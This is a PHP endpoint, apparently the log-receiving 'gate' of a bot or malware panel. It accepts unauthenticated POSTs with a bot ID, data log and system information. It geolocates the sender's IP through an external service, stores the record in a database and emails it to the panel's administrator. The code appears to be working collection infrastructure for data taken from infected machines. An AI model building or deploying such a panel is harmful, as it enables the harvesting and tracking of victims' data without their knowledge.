<?php

//$about_ip = $_SERVER['REMOTE_ADDR'];
$about_lang=$_SERVER["HTTP_ACCEPT_LANGUAGE"];


if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $about_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $about_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $about_ip = $_SERVER['REMOTE_ADDR'];
}

require_once 'config/config.php';
include_once('AboutGuest.php');
$AboutGuest = new AboutGuest;

$Aboutdate = date('Y-m-d H:i:s');


  $ip = $_SERVER['REMOTE_ADDR'];
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip.'?lang=en'));
    if($query && $query['status'] == 'success') {

      $geo_info_ip='IP: '.$query['query'];
      $geo_info_country='Country: '.$query['country'];
      $geo_info_region='Region: '.$query['regionName'];
      $geo_info_city='City: '.$query['city'];
      $geo_info_zip='ZIP: '.$query['zip'];
      $geo_info_isp='ISP: '.$query['isp'];
      $geo_info_timezone='Timezone: '.$query['timezone'];
    }




//require_once BASE_PATH.'/includes/auth_validate.php';

// Serve POST method, After successful insert, redirect to logs.php page.
if ($_SERVER['REQUEST_METHOD'] === 'POST')
{

$usersysteminfo = $_POST['usersysteminfo'];
$datalog = $_POST['datalog'];
$logname = $_POST['logname'];
$botid = $_POST['botid'];

$full_info =  "
Log Date/Time: $Aboutdate
$geo_info_ip
$geo_info_country
$geo_info_region
$geo_info_city
$geo_info_zip
$geo_info_isp
$geo_info_timezone
User agent: $AboutGuest->agent
Browser: $AboutGuest->browser  $AboutGuest->version
$AboutGuest->operating_system $AboutGuest->os_version
$AboutGuest->mobile
HTTP HEADERS
$about_lang
$usersysteminfo

";


    // Mass Insert Data. Keep "name" attribute in html form same as column name in mysql table.
   // $data_to_db = array_filter($_POST);

    $data_to_db['userinformation'] = $full_info;
    $data_to_db['datalog'] = $datalog;
    $data_to_db['logname'] = $logname;
    $data_to_db['botid'] = $botid;

    // Insert user and timestamp
  //  $data_to_db['created_by'] = $_SESSION['user_id'];
     $data_to_db['created_at'] = date('Y-m-d H:i:s');

    $db = getDbInstance();
    $last_id = $db->insert('logs', $data_to_db);

    $data_to_db_push['pushnoticelinks'] = $logname;
	$db->where('id', '1');
	$stat = $db->update('admin_accounts', $data_to_db_push);

//mail notice
    $mailinfo= $datalog.'   '.$full_info;
    $mailinfo = wordwrap($mailinfo, 70, "\r\n");

     $db = getDbInstance();
     $db->where('id', '1');
     $admin_account = $db->getOne("admin_accounts");
     $adminemail = $admin_account['emailfornotice'];

     mail($adminemail, $logname, $mailinfo);



	    if ($last_id)
    {
        //$_SESSION['success'] = 'LOG added successfully!';
        // Redirect to the listing page
       // header('Location: customers.php');
        // Important! Don't execute the rest put the exit/die.
    	exit();
    }
    else
    {
        echo 'Insert failed: ' . $db->getLastError();
        exit();
    }
}

// We are using same form for adding and editing. This is a create form so declare $edit = false.
$edit = false;
?>
<?php include BASE_PATH.'/includes/header.php'; ?>
<div id="page-wrapper">
    <div class="row">
        <div class="col-lg-12">
            <h2 class="page-header">Add log</h2>
        </div>
    </div>
    <!-- Flash messages -->
    <?php include BASE_PATH.'/includes/flash_messages.php'; ?>
    <form class="form" action="" method="post" id="customer_form" enctype="multipart/form-data">
        <?php include BASE_PATH.'/forms/log_form.php'; ?>
    </form>
</div>

<?php include BASE_PATH.'/includes/footer.php'; ?>
